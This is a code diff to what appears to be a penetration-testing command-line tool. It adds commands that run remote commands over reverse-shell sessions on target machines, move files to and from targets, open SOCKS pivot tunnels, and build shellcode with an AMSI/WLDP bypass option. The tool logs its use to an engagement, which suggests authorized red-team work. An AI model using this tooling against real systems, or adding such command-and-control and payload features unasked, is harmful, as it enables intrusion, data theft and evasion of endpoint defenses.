@@ -765,10 +765,10 @@ vpn
     console.error(`[vpn] Added profile "${name}" -> ${dest}`);
   });
 
-// --- shell (tmux sessions inside containers) --------------------------------
-const shell = program.command("shell").description("Manage tmux sessions inside containers");
+// --- tmux (sessions inside containers, formerly "shell") ---------------------
+const tmux = program.command("tmux").description("Manage tmux sessions inside containers");
 
-shell
+tmux
   .command("new")
   .description("Create a named tmux session in the active container")
   .argument("<name>", "session name")
@@ -780,7 +780,7 @@ shell
     console.log(`Session '${name}' created in ${container}`);
   });
 
-shell
+tmux
   .command("attach")
   .description("Attach to a tmux session")
   .argument("<name>", "session name")
@@ -791,7 +791,7 @@ shell
     spawnSync("docker", ["exec", "-it", container, "tmux", "attach-session", "-t", name], { stdio: "inherit" });
   });
 
-shell
+tmux
   .command("list")
   .description("List tmux sessions")
   .option("--container <name>")
@@ -804,7 +804,7 @@ shell
     });
   });
 
-shell
+tmux
   .command("kill")
   .description("Kill a tmux session")
   .argument("<name>", "session name")
@@ -816,6 +816,137 @@ shell
       if (err) console.error(`Failed to kill session: ${err.message}`);
       else console.log(`Session '${name}' killed`);
     });
+  });
+
+// --- gleipnir (reverse shell sessions) --------------------------------------
+
+const GLEIPNIR_SOCK = process.env.PK_GLEIPNIR_SOCK ?? "/tmp/gleipnir.sock";
+
+async function gleipnirApi(request: Record<string, unknown>): Promise<Record<string, unknown>> {
+  const net = await import("node:net");
+  return new Promise((resolve, reject) => {
+    const client = net.createConnection(GLEIPNIR_SOCK, () => {
+      client.write(JSON.stringify(request) + "\n");
+    });
+    let data = "";
+    client.on("data", (chunk: Buffer) => { data += chunk.toString(); });
+    client.on("end", () => {
+      try { resolve(JSON.parse(data.trim())); }
+      catch { reject(new Error(`invalid response: ${data}`)); }
+    });
+    client.on("error", (err: Error) => {
+      reject(new Error(`gleipnir relay not reachable (${GLEIPNIR_SOCK}): ${err.message}`));
+    });
+  });
+}
+
+const shell = program.command("shell").description("Execute commands on gleipnir sessions");
+
+shell
+  .command("list")
+  .description("List active gleipnir sessions")
+  .action(async () => {
+    const resp = await gleipnirApi({ action: "sessions" });
+    if (!resp.ok) { console.error(`Error: ${resp.error}`); process.exit(1); }
+    const sessions = resp.data as Array<Record<string, unknown>>;
+    if (sessions.length === 0) { console.log("No active sessions"); return; }
+    for (const s of sessions) {
+      const status = s.connected ? "connected" : "disconnected";
+      console.log(`  ${s.name}\t${s.os}/${s.arch}\t${s.username}@${s.hostname}\t${status}`);
+    }
+  });
+
+shell
+  .command("exec")
+  .description("Execute a command on a gleipnir session")
+  .argument("<session>", "session name")
+  .argument("<command...>", "command to execute")
+  .option("--timeout <seconds>", "command timeout", "300")
+  .action(async (session: string, command: string[], o) => {
+    const cmd = command.join(" ");
+    const resp = await gleipnirApi({
+      action: "exec",
+      session,
+      command: cmd,
+      timeout: parseInt(o.timeout, 10),
+    });
+    if (!resp.ok) { console.error(`Error: ${resp.error}`); process.exit(1); }
+    const output = (resp.data as Record<string, string>).output;
+    process.stdout.write(output);
+    if (!output.endsWith("\n")) process.stdout.write("\n");
+
+    try {
+      const eid = await resolveEngagementId(undefined);
+      await repo.logActivity({
+        engagementId: eid,
+        phase: "exploit",
+        action: `gleipnir exec on ${session}: ${cmd}`,
+        command: `pk shell exec ${session} ${cmd}`,
+      });
+    } catch { /* no active engagement, skip logging */ }
+  });
+
+program
+  .command("upload")
+  .description("Upload a file to a target via gleipnir session")
+  .argument("<session>", "session name")
+  .argument("<src>", "local source file path")
+  .argument("<dst>", "remote destination path")
+  .action(async (session: string, src: string, dst: string) => {
+    const resp = await gleipnirApi({ action: "upload", session, src, dst });
+    if (!resp.ok) { console.error(`Error: ${resp.error}`); process.exit(1); }
+    console.log(`Uploaded ${src} -> ${dst}`);
+  });
+
+program
+  .command("download")
+  .description("Download a file from a target via gleipnir session")
+  .argument("<session>", "session name")
+  .argument("<src>", "remote source file path")
+  .argument("<dst>", "local destination path")
+  .action(async (session: string, src: string, dst: string) => {
+    const resp = await gleipnirApi({ action: "download", session, src, dst });
+    if (!resp.ok) { console.error(`Error: ${resp.error}`); process.exit(1); }
+    const data = resp.data as Record<string, unknown>;
+    console.log(`Downloaded ${src} -> ${dst} (${data.size} bytes)`);
+  });
+
+const tunnel = program.command("tunnel").description("Manage SOCKS tunnels through gleipnir sessions");
+
+tunnel
+  .command("up")
+  .description("Start a SOCKS5 proxy through a gleipnir session")
+  .argument("<session>", "session name")
+  .option("--socks <port>", "local SOCKS port", "1080")
+  .action(async (session: string, o) => {
+    const port = parseInt(o.socks, 10);
+    const resp = await gleipnirApi({ action: "socks", session, port });
+    if (!resp.ok) { console.error(`Error: ${resp.error}`); process.exit(1); }
+    console.log(`SOCKS5 proxy for '${session}' listening on 127.0.0.1:${port}`);
+    console.log(`  proxychains: socks5 127.0.0.1 ${port}`);
+  });
+
+tunnel
+  .command("down")
+  .description("Stop a SOCKS tunnel")
+  .argument("<session>", "session name")
+  .action(async (session: string) => {
+    const resp = await gleipnirApi({ action: "socks", session, port: 0, stop: true });
+    if (!resp.ok) { console.error(`Error: ${resp.error}`); process.exit(1); }
+    console.log(`Tunnel for '${session}' stopped`);
+  });
+
+tunnel
+  .command("status")
+  .description("List active SOCKS tunnels")
+  .action(async () => {
+    const resp = await gleipnirApi({ action: "tunnels" });
+    if (!resp.ok) { console.error(`Error: ${resp.error}`); process.exit(1); }
+    const tunnels = resp.data as Array<Record<string, unknown>>;
+    if (tunnels.length === 0) { console.log("No active tunnels"); return; }
+    for (const t of tunnels) {
+      console.log(`  ${t.session}\t127.0.0.1:${t.port}`);
+    }
   });
 
 // --- events (Docker exec watcher) ------------------------------------------
@@ -1175,6 +1306,81 @@ program
       if (result.stderr) process.stderr.write(result.stderr);
     }
     process.exitCode = result.code;
+  });
+
+// --- build (x86_64 build sidecar commands) ---------------------------------
+const build = program.command("build").description("Cross-compile tools using the x86_64 builder sidecar");
+
+build
+  .command("donut")
+  .description("Generate position-independent shellcode from a PE executable using donut")
+  .argument("<input>", "path to the input .exe file")
+  .option("--arch <n>", "target arch: 1=x86, 2=amd64, 3=both", "2")
+  .option("--bypass <n>", "AMSI/WLDP bypass: 1=none, 2=abort, 3=continue", "3")
+  .option("--format <n>", "output format: 1=bin, 2=base64, 3=c, 4=ruby, 5=python, 6=powershell, 7=csharp, 8=hex", "1")
+  .option("--class <name>", ".NET class name")
+  .option("--method <name>", ".NET method name")
+  .option("--params <args>", "command-line params for the payload")
+  .option("--output <name>", "output filename (relative to .build/)", "payload.bin")
+  .action(async (input: string, o) => {
+    const { resolve, basename } = await import("node:path");
+    const { existsSync: exists, mkdirSync, copyFileSync: cpSync } = await import("node:fs");
+    const { execSync } = await import("node:child_process");
+
+    const inputPath = resolve(input);
+    if (!exists(inputPath)) {
+      console.error(`[build] Input file not found: ${inputPath}`);
+      process.exit(1);
+    }
+
+    const buildDir = resolve(process.cwd(), ".build");
+    mkdirSync(buildDir, { recursive: true });
+
+    const inputName = basename(inputPath);
+    cpSync(inputPath, join(buildDir, inputName));
+
+    // Ensure the builder container is running
+    console.error("[build] Starting builder-x86 container...");
+    try {
+      execSync("docker compose --profile build up -d builder-x86", {
+        stdio: ["pipe", "pipe", "pipe"],
+        timeout: 120000,
+      });
+    } catch (err) {
+      console.error(`[build] Failed to start builder container: ${err instanceof Error ? err.message : err}`);
+      process.exit(1);
+    }
+
+    // Build the donut command
+    const donutArgs: string[] = ["-f", `/build/${inputName}`];
+    donutArgs.push("-a", o.arch);
+    donutArgs.push("-b", o.bypass);
+    donutArgs.push("-t", o.format);
+    donutArgs.push("-o", `/build/${o.output}`);
+    if (o.class) donutArgs.push("-c", o.class);
+    if (o.method) donutArgs.push("-m", o.method);
+    if (o.params) donutArgs.push("-p", o.params);
+
+    const donutCmd = `python3 -m donut ${donutArgs.join(" ")}`;
+    console.error(`[build] Running: ${donutCmd}`);
+
+    try {
+      const result = execSync(
+        `docker compose exec builder-x86 ${donutCmd}`,
+        { encoding: "utf-8", timeout: 120000 },
+      );
+      if (result.trim()) console.log(result.trim());
+    } catch (err) {
+      console.error(`[build] donut failed: ${err instanceof Error ? err.message : err}`);
+      process.exit(1);
+    }
+
+    const outPath = join(buildDir, o.output);
+    if (exists(outPath)) {
+      console.error(`[build] Output: ${outPath}`);
+    } else {
+      console.error(`[build] Warning: expected output not found at ${outPath}`);
+    }
   });
 
 // --- init (scaffold workspace) ---------------------------------------------
